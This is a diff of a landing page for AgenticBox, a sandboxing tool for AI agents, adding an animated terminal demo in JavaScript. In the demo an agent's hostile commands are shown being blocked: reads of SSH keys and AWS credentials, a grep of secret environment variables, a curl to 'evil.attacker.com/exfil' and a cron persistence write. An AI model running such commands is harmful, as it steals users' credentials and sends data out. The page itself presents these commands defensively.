@@ -3,12 +3,12 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>AgenticBox — Governance Layer for AI Agents</title>
-  <meta name="description" content="The governance layer for AI agents. Sandbox execution, permissions, secrets, observability, cost controls. Open source. Local-first. Run on your machine or ours." />
+  <title>AgenticBox — Watch What Your AI Agent Does</title>
+  <meta name="description" content="Your agent tried to read SSH keys. AgenticBox caught it. Sandbox execution with real-time permission logging. Open source. Local-first." />
 
   <!-- Open Graph / Twitter -->
-  <meta property="og:title" content="AgenticBox — Governance Layer for AI Agents" />
-  <meta property="og:description" content="The governance layer for AI agents. Sandbox execution, permissions, secrets, observability, cost controls. Open source. Local-first. Run on your machine or ours." />
+  <meta property="og:title" content="AgenticBox — Watch What Your AI Agent Does" />
+  <meta property="og:description" content="Your agent tried to read SSH keys. AgenticBox caught it. Sandbox execution with real-time permission logging. Open source. Local-first." />
   <meta property="og:type" content="website" />
   <meta name="twitter:card" content="summary_large_image" />
 
@@ -494,6 +494,131 @@
       outline: 2px solid var(--accent);
       outline-offset: 2px;
     }
+
+    /* ============ TERMINAL DEMO ============ */
+    .terminal-demo-wrap {
+      max-width: 720px;
+      margin: 0 auto;
+      perspective: 1000px;
+    }
+
+    .terminal-demo {
+      background: #050607;
+      border: 1px solid var(--border-bright);
+      border-radius: var(--radius-lg);
+      overflow: hidden;
+      box-shadow:
+        0 0 0 1px rgba(122, 155, 78, 0.08),
+        0 24px 64px -20px rgba(0,0,0,0.7),
+        0 0 80px -30px var(--accent-glow);
+      font-family: var(--font-mono);
+      transform: rotateX(1deg);
+      transition: transform 400ms ease;
+    }
+    .terminal-demo:hover { transform: rotateX(0deg) translateY(-2px); }
+
+    .terminal-header {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 10px 16px;
+      background: #0a0c0d;
+      border-bottom: 1px solid var(--border);
+    }
+    .terminal-dots { display: flex; gap: 6px; }
+    .terminal-dot {
+      width: 11px; height: 11px; border-radius: 50%;
+      background: var(--border-bright);
+    }
+    .terminal-title {
+      flex: 1; text-align: center;
+      font-size: 0.68rem; color: var(--text-muted);
+      letter-spacing: 0.03em;
+    }
+
+    .terminal-body {
+      padding: 18px 22px;
+      min-height: 320px;
+      font-size: 0.82rem;
+      line-height: 1.85;
+      color: var(--text);
+      position: relative;
+    }
+
+    .terminal-body .cmd { color: var(--text-dim); }
+    .terminal-body .cmd-accent { color: var(--accent-strong); }
+    .terminal-body .agent-action { color: var(--warning); }
+    .terminal-body .blocked {
+      color: var(--danger);
+      font-weight: 600;
+    }
+    .terminal-body .allowed {
+      color: var(--accent);
+      font-weight: 600;
+    }
+    .terminal-body .reason { color: var(--text-muted); }
+    .terminal-body .dim { color: var(--text-muted); }
+
+    .terminal-body .cursor {
+      display: inline-block;
+      width: 8px; height: 15px;
+      background: var(--accent);
+      vertical-align: middle;
+      animation: blink 1s step-end infinite;
+    }
+    @keyframes blink { 50% { opacity: 0; } }
+
+    .terminal-body .demo-line {
+      opacity: 0;
+      animation: lineIn 0.3s ease forwards;
+    }
+
+    @keyframes lineIn {
+      from { opacity: 0; transform: translateY(2px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .terminal-body .demo-sep {
+      height: 1px;
+      background: linear-gradient(90deg, transparent, var(--border-bright), transparent);
+      margin: 10px 0;
+      opacity: 0;
+      animation: lineIn 0.3s ease forwards;
+    }
+
+    .terminal-body .demo-summary {
+      color: var(--text);
+      font-weight: 600;
+    }
+
+    /* Restart button */
+    .demo-replay {
+      position: absolute;
+      top: 10px; right: 14px;
+      background: var(--surface); border: 1px solid var(--border);
+      color: var(--text-muted);
+      font-family: var(--font-mono); font-size: 0.62rem;
+      padding: 4px 10px; border-radius: 6px;
+      cursor: pointer; opacity: 0;
+      transition: all var(--transition);
+    }
+    .terminal-demo:hover .demo-replay { opacity: 1; }
+    .demo-replay:hover { background: var(--accent); color: #050607; border-color: var(--accent); }
+
+    /* Hero glow */
+    .hero-glow {
+      position: absolute;
+      top: 40%; left: 50%;
+      transform: translate(-50%, -50%);
+      width: 600px; height: 400px;
+      background: radial-gradient(ellipse, var(--accent-glow), transparent 70%);
+      filter: blur(60px);
+      opacity: 0.4;
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    .hero .container { position: relative; z-index: 1; }
   </style>
 </head>
 <body>
@@ -518,11 +643,12 @@
 </header>
 
 <section class="hero">
+  <div class="hero-glow"></div>
   <div class="container">
     <span class="badge">Open Source — MIT OR Apache-2.0</span>
     <span class="phase-badge ready" style="margin-left: 10px;">Phase 1 Ready</span>
-    <h1>Governance Layer<br />for <span class="accent">AI Agents</span></h1>
-    <p>Sandbox execution, permissions, secrets, observability, cost controls. Run agents with total control. Open source. Local-first. Run on your machine or ours.</p>
+    <h1>Watch what your agent does<br />when <span class="accent">you're not looking</span></h1>
+    <p>Every action caught. Every permission logged. AgenticBox sandboxes AI agents with real-time ALLOWED/BLOCKED enforcement — terminal, filesystem, network.</p>
 
     <div class="btn-group">
       <a href="https://github.com/agenticbox/agenticbox" target="_blank" rel="noopener" class="btn btn-primary">
@@ -530,6 +656,24 @@
         View on GitHub
       </a>
       <a href="#install" class="btn btn-secondary" onclick="showInstall()">Run Locally</a>
+    </div>
+
+    <!-- Animated Terminal Demo -->
+    <div class="terminal-demo-wrap" style="margin-top: 56px; margin-bottom: 20px;">
+      <div class="terminal-demo" id="terminalDemo">
+        <div class="terminal-header">
+          <div class="terminal-dots">
+            <div class="terminal-dot"></div>
+            <div class="terminal-dot"></div>
+            <div class="terminal-dot"></div>
+          </div>
+          <div class="terminal-title">agenticbox run — sandbox session</div>
+          <button class="demo-replay" onclick="replayDemo()">↻ Replay</button>
+        </div>
+        <div class="terminal-body" id="terminalBody">
+          <!-- Animated by JS -->
+        </div>
+      </div>
     </div>
 
     <!-- Install Section -->
@@ -838,6 +982,100 @@
       }
     });
   });
+
+  // ============ ANIMATED TERMINAL DEMO ============
+  const demoLines = [
+    { html: '<span class="cmd">$ </span><span class="cmd-accent">agenticbox run</span> <span class="dim">--fs:readonly --network:allowlist -- ./agent.sh</span>', delay: 0 },
+    { html: '', delay: 500 },
+    { html: '<span class="dim">Spawning agent in sandbox...</span>', delay: 200 },
+    { html: '<span class="dim">Permissions: terminal=on  fs=readonly  network=allowlist(api.openai.com)</span>', delay: 300 },
+    { html: '', delay: 400 },
+
+    { html: '<span class="agent-action">AGENT →</span> cat ~/.ssh/id_rsa', delay: 600 },
+    { html: '<span class="blocked">  ✗ BLOCKED</span> <span class="reason">→ protected path: SSH private keys</span>', delay: 800 },
+
+    { html: '<span class="agent-action">AGENT →</span> curl https://evil.attacker.com/exfil', delay: 800 },
+    { html: '<span class="blocked">  ✗ BLOCKED</span> <span class="reason">→ network: evil.attacker.com not in allowlist</span>', delay: 800 },
+
+    { html: '<span class="agent-action">AGENT →</span> echo "..." > /etc/cron.d/persist', delay: 800 },
+    { html: '<span class="blocked">  ✗ BLOCKED</span> <span class="reason">→ filesystem: readonly (write denied)</span>', delay: 800 },
+
+    { html: '<span class="agent-action">AGENT →</span> cat ~/.aws/credentials', delay: 800 },
+    { html: '<span class="blocked">  ✗ BLOCKED</span> <span class="reason">→ protected path: cloud credentials</span>', delay: 800 },
+
+    { html: '<span class="agent-action">AGENT →</span> env | grep -i "token|key|secret"', delay: 800 },
+    { html: '<span class="blocked">  ✗ BLOCKED</span> <span class="reason">→ protected: environment variables masked</span>', delay: 800 },
+
+    { html: '<span class="agent-action">AGENT →</span> curl https://api.openai.com/v1/models', delay: 800 },
+    { html: '<span class="allowed">  ✓ ALLOWED</span> <span class="reason">→ network: api.openai.com in allowlist</span>', delay: 800 },
+
+    { html: 'sep', delay: 400 },
+    { html: '<span class="demo-summary">Blocked: 5  ·  Allowed: 1</span>', delay: 400 },
+    { html: '<span class="dim">Every attempt caught. Every decision logged.</span>', delay: 300 },
+  ];
+
+  let demoTimers = [];
+
+  function playDemo() {
+    const body = document.getElementById('terminalBody');
+    body.innerHTML = '';
+    demoTimers.forEach(t => clearTimeout(t));
+    demoTimers = [];
+
+    let cumulativeDelay = 400;
+
+    demoLines.forEach((line, i) => {
+      const timer = setTimeout(() => {
+        if (line.html === 'sep') {
+          const sep = document.createElement('div');
+          sep.className = 'demo-sep';
+          sep.style.animationDelay = '0ms';
+          body.appendChild(sep);
+        } else if (line.html === '') {
+          const br = document.createElement('div');
+          br.style.minHeight = '0.5em';
+          body.appendChild(br);
+        } else {
+          const el = document.createElement('div');
+          el.className = 'demo-line';
+          el.innerHTML = line.html;
+          body.appendChild(el);
+        }
+        body.scrollTop = body.scrollHeight;
+      }, cumulativeDelay);
+      demoTimers.push(timer);
+      cumulativeDelay += line.delay;
+    });
+
+    // Add blinking cursor at the end
+    const cursorTimer = setTimeout(() => {
+      const cursor = document.createElement('span');
+      cursor.className = 'cursor';
+      cursor.innerHTML = '&nbsp;';
+      body.appendChild(cursor);
+    }, cumulativeDelay);
+    demoTimers.push(cursorTimer);
+  }
+
+  function replayDemo() { playDemo(); }
+
+  // Start demo when page loads
+  window.addEventListener('load', () => {
+    playDemo();
+  });
+
+  // Replay when demo scrolls into view
+  let demoPlayedOnce = false;
+  const demoObserver = new IntersectionObserver((entries) => {
+    entries.forEach(entry => {
+      if (entry.isIntersecting && !demoPlayedOnce) {
+        demoPlayedOnce = true;
+        playDemo();
+      }
+    });
+  }, { threshold: 0.3 });
+  const demoEl = document.getElementById('terminalDemo');
+  if (demoEl) demoObserver.observe(demoEl);
 </script>
 </body>
 </html>
